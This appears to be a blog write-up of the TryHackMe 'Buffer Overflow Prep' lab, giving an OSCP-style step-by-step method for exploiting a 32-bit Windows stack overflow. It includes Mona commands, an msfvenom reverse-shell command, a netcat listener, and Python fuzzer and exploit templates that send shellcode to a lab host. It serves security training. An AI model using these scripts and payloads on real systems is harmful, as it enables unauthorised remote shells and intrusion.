---
layout: post
title:  "Buffer Overflow Prep"
date:   2021-06-13 17:13:21 -0400
category: [writeups, resources]
challenge-source: [TryHackMe]
challenge-category: ['Buffer Overflows']
tags: [TryHackMe]
author: shinris3n
---

<a href = "https://tryhackme.com/" target="_blank"><img src="/assets/writeups/TryHackMe/THMlogo.png" width="225"></a>

# 11 Step Process for Exploiting a Windows 32-Bit Application Buffer Overflow <br>

#### (Procedure and Worksheet based on Material from the Tib3rius [Buffer Overflow Prep](https://tryhackme.com/room/bufferoverflowprep){:target="_blank"} Try Hack Me Room)

## <a name=toc></a>Table of Contents

1. [Tools](#tools)
2. [Process with Example Commands and Output](#process)
3. [List of Example Commands by Application](#applications)
4. [Python 3 Fuzzer Script Template](#fuzzer)
5. [Python 3 Exploit Script Template](#exploit) 
6. [OSCP Friendly Manual BOF Exploit Worksheet](#worksheet)

<div style="page-break-after: always; visibility: hidden"> \pagebreak </div>

* * *

## <a name=tools></a>Tools

- Immunity Debugger with Mona Plugin
- Metasploit Framework
- Python 3 fuzzer and exploit script templates (found below)
- XFreeRDP
- Netcat

[Return to Table of Contents](#toc)

* * *

<div style="page-break-after: always; visibility: hidden"> \pagebreak </div>

## <a name=process></a>Process with Example Commands and Output 


**Step 1** - Open an RDP session to the target machine, if applicable then run the vulnerable application and fuzz to find the general range of the EIP register offset at the point of the application crashing.

`xfreerdp /u:admin /p:password /cert:ignore /v:10.10.11.33 /workarea`

`python3 fuzzer.py`

**Step 2** - Create a pattern that's 400 characters over the estimated offset via metasploit.

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1700`

**Step 3** - Modify exploit script with the target ip and port, pattern as the payload, offset = 0, retn = "", padding = "", postfix = "".

**Step 4** - Open Immunity Debugger (running as admin) and load the vulnerable application, then use Mona to find the exact EIP offset.

`!mona findmsp -distance 1100`

![91eed7279aec31c58183ac4f1d1b56d3.png](/assets/writeups/TryHackMe/BOFPrep/076f8fddebb340d0bd9c788ecade2743.png)

**Step 5** - Verify the offset value by updating and running exploit.py with no payload, the found offset value, and a return address string ("e.g. BCDE") to check for EIP overwrite.

![bce6ef0f3b0529f9ad73f69fe5074110.png](/assets/writeups/TryHackMe/BOFPrep/55c279c6b2724a61973b20832f27ebd0.png)

**Step 6** - Use Mona to generate a bad character set, excluding \x00, update exploit.py then run it, noting the ESP register value.

`!mona config -set workingfolder c:\mona\%p`
`!mona bytearray -b "\x00"`

![911f323f12a625db489113b17199229a.png](/assets/writeups/TryHackMe/BOFPrep/8ef8c60148f9480e98a83849f2bc1f4b.png)

**Step 7** - Use Mona to find possible bad characters with a comparison between the byte array and ESP.

`!mona compare -f C:\mona\oscp\bytearray.bin -a 0192FA30`

**Step 8** - Update the byte array and payload to exclude all possible bad characters, then run the exploit followed by a Mona comparison to find bad characters.  Remove identified bad characters (ignoring the second of adjacent bytes that are flagged as bad, as this may not be the case) and repeat the process until all bad characters have been eliminated.

![5792de7cc1861f92bb50d7d596a32401.png](/assets/writeups/TryHackMe/BOFPrep/92ad0e178a52488cbb8131f1d5c37a28.png)

`!mona bytearray -b "\x00\x11\x40\x5f\xb8\xee"`

`!mona compare -f C:\mona\oscp\bytearray.bin -a 017CFA30` (Update the ESP address after each crash)

![0d6965704c28259558dd0dd352f5e571.png](/assets/writeups/TryHackMe/BOFPrep/3dfe0c17cab748fbbd4a848a9a6ae22d.png)

**Step 9** - Find a JMP point using Mona and update the RETN variable in the exploit script accordingly.

`!mona jmp -r esp -cpb "\x00\x11\x40\x5f\xb8\xee"`

![5f1b0a5b192ec6f30b3bed16b0b1c387.png](/assets/writeups/TryHackMe/BOFPrep/4067cd8d3e8f4249ab4b7cc32db2f634.png)

`retn = "\x03\x12\x50\x62"` (Little Endian)

**Step 10** - Generate an MSF reverse shell payload (excluding all bad characters identified) and replace the payload value in exploit.py, along with NOP (\x90) padding of at least 16 bytes. 

`msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -b "\x00\x11\x40\x5f\xb8\xee" -f c`

**Step 11** - Open up a Netcat listener and run the exploit for reverse shell.

`nc -nvlp 4444`

![49f1b60f4a406df4a7ec27ae5e868cc0.png](/assets/writeups/TryHackMe/BOFPrep/5b5558e9b28244c69fac2f0b73b994cc.png)

[Return to Table of Contents](#toc)

***

<div style="page-break-after: always; visibility: hidden"> \pagebreak </div>

## <a name=applications></a>List of Example Commands by Application

### RDP: 
`xfreerdp /u:admin /p:password /cert:ignore /v:10.10.11.33 /workarea`

### Metasploit:
`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600`

### Mona:
Set Working Folder Path - `!mona config -set workingfolder c:\mona\%p`

Find EIP offset - `!mona findmsp -distance 1100`

Generate a Byte Array Excluding Bad Chars - `!mona bytearray -b "\x00\x09"`

Find Bad Characters - `!mona compare -f C:\mona\oscp\bytearray.bin -a 01A0FA30`

Find JMP ESP spots Excluding Bad Chars - `!mona jmp -r esp -cpb "\x00\x23\x24\x3c\x3d\x83\x84\xba\xbb"`

Generate a Shellscript Excluding Bad Chars - `msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -b "\x00\x23\x3c\x83\xba" -f c`


### Basic Netcat Listener for Reverse Shell:
`nc -nvlp 4444`

[Return to Table of Contents](#toc)

***

<div style="page-break-after: always; visibility: hidden"> \pagebreak </div>

## <a name=fuzzer></a>Python 3 Fuzzer Script Template

{% highlight python %}
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.98.22"

port = 1337
timeout = 5
prefix = "OVERFLOW2 " # This specific input is necessary for the THM room exercises

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
{% endhighlight %}

[Return to Table of Contents](#toc)

***

<div style="page-break-after: always; visibility: hidden"> \pagebreak </div>

## <a name=exploit></a>Python 3 Exploit Script Template

{% highlight python %}
import socket

ip = "10.10.98.22"
port = 1337

prefix = "OVERFLOW2 " # This specific input is necessary for the THM room exercises
offset = 634
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload = ("\xfc\xbb\x17\x74\x72\x5e\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xeb\x9c\xf0\x5e\x13"
"\x90\x48\xf4\xd4\x90\x6e\x0a\xd7"
)
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
{% endhighlight %}

[Return to Table of Contents](#toc)

***

<div style="page-break-after: always; visibility: hidden"> \pagebreak </div>

## <a name=worksheet></a>OSCP Friendly Manual BOF Exploit Worksheet

- <input type="checkbox" unchecked> Step 1 - Open an RDP session to the target machine, if applicable then run the vulnerable application and fuzz to find the general range of the EIP register offset at the point of the application crashing.

	`python3 fuzzer.py`
	
	<mark>Crashed at <input type="number" id="estoffset" name="estoffset" value ="
"/> bytes. <br> Add 400 to the value entered above: <input type="number" id="estoffsetplus" name="estoffsetplus" value ="
"/><br>(Substitute for XXXX in code segments below)</mark>

- <input type="checkbox" unchecked> Step 2 - Create a pattern that’s 400 characters over the estimated offset via metasploit.

	`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l XXXX`

- <input type="checkbox" unchecked> Step 3 - Modify exploit script with the target ip and port, pattern as the payload, offset = 0, retn = “”, padding = “”, postfix = “”.

- <input type="checkbox" unchecked> Step 4 - Open Immunity Debugger (running as admin) and load the vulnerable application, then use Mona to find the exact EIP offset.

	`!mona findmsp -distance XXXX`
	
	<mark>Exact Offset = <input type="number" id="offset" name="offset" value ="
"/> <br>(Substitute for PPPP in code segments below)</mark>

- <input type="checkbox" unchecked> Step 5 - Verify the offset value by updating and running exploit.py with no payload, the found offset value, and a return address string (“e.g. BCDE”) to check for EIP overwrite.

	`python3 exploit.py`

- <input type="checkbox" unchecked> Step 6 - Use Mona to generate a bad character set, excluding \x00, update exploit.py then run it, noting the ESP register value.

	`!mona config -set workingfolder c:\mona\%p`

	`!mona bytearray -b "\x00"`

	<mark>ESP = 0x<input type="text" id="esp" name="esp" value ="
"/> <br>(Substitute for YYYYYYYY in code segments below)</mark>

- <input type="checkbox" unchecked> Step 7 - Use Mona to find possible bad characters with a comparison between the byte array and ESP.

	`!mona compare -f C:\mona\oscp\bytearray.bin -a YYYYYYYY`

- <input type="checkbox" unchecked> Step 8 - Update the byte array and payload to exclude all possible bad characters, then run the exploit followed by a Mona comparison to find bad characters. Remove identified bad characters (ignoring the second of adjacent bytes that are flagged as bad, as this may not be the case) and repeat the process until all bad characters have been eliminated.

	<mark>Bad Character Array = "\x00\ <input type="text" id="badchars" name="badchars" value ="
"/><br>(Substitute for "\x00\x??\x??\x??" in code segments below)</mark>

	`!mona bytearray -b "\x00\x??\x??\x??"`
	
	`python3 exploit.py`

	<mark>New ESP = 0x<input type="text" id="newesp" name="newesp" value ="
"/> <br>(Substitute for ZZZZZZZZ in code segments below)</mark>

	`!mona compare -f C:\mona\oscp\bytearray.bin -a ZZZZZZZZ` (Update the ESP address after each crash)

- <input type="checkbox" unchecked> Step 9 - Find a JMP point using Mona and update the RETN variable in the exploit script accordingly.

	`!mona jmp -r esp -cpb "\x00\x??\x??\x??"`
	
	<mark>Chosen return address = 0x<input type="text" id="retn" name="retn" value ="
"/> <br>(Substitute for 0xTHISADDR in code segments below)</mark>
	
	`retn = "\xDR\xAD\xIS\xTH"` (Little Endian format for 0xTHISADDR)

- <input type="checkbox" unchecked> Step 10 - Generate an MSF reverse shell payload (excluding all bad characters identified) and replace the payload value in exploit.py, along with NOP (\x90) padding of at least 16 bytes.

	<mark>Your IP Address = <input type="text" id="ipaddr" name="ipaddr" value =""/> <br>(Substitute for 127.0.0.1 in code segments below)</mark><br><br>
	<mark>Your Listener Port = <input type="text" id="listener" name="listener" value =""/> <br>(Substitute for 4444 in code segments below)</mark>
		
	`msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -b "\x00\x??\x??\??" -f c`

- <input type="checkbox" unchecked> Step 11 - Open up a Netcat listener and run the exploit for reverse shell.

	`nc -nvlp 4444`

[Return to Table of Contents](#toc)

***